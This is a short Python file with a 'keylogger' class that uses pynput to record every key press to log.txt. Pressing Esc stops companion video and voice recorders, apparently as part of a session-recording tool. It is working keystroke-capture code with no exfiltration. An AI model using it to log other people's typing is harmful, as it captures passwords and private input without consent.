from pynput.keyboard import Listener
import sys # to clear the input buffer

class keylogger:
    def __init__(self,video_recorder,voice_recorder):
        self.video_recorder=video_recorder
        self.voice_recorder=voice_recorder


        self.keys = []
        
    def on_press(self,key):
        self.keys.append(key)
        self.write_file(self.keys)

    def write_file(self,keys):
        Identities={
            "Key.enter":"\n",
            "Key.space":" ",
            "Key.ctrl_l":"ctrl+",
            "Key.shift":"shift+",
            "Key.backspace":""
            }
    
        with open('log.txt','w') as f:
            for key in keys:
                k = str(key).replace("'","")

                if k in Identities:
                    k=Identities[k]

                elif k =="Key.esc":
                    self.video_recorder.stop()
                    self.voice_recorder.stop()
                    exit()

                sys.stdin.flush()
                f.write(k)
        f.close()

    def listen(self):         
        with Listener(on_press = self.on_press) as listener:
            listener.join()